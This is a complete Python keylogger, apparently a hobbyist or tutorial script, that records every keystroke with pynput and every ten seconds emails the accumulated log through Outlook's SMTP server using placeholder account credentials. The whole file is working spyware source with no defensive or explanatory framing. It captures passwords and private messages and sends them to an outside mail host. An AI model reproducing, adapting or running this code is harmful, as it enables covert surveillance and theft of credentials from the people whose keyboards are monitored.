import pynput.keyboard
import smtplib
import threading
log =""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)

def send_mail(email,psswd):
    global log
    try:
        title = "TEST"
        message = log
        content = "Subject: {0}\n\n{1}".format(title, message)
    except Exception as e:
        print("Hata Oluştu!\n {0}".format(e))

    email_server =smtplib.SMTP("smtp-mail.outlook.com",587)
    email_server.starttls()
    email_server.login(email,psswd)
    email_server.sendmail(email,email,content.encode("utf-8"))
    email_server.quit()

def thread_function():
    global log
    send_mail("youradress@outlook.com","yourpassword")
    log = ""
    timer_object = threading.Timer(10,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press = callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
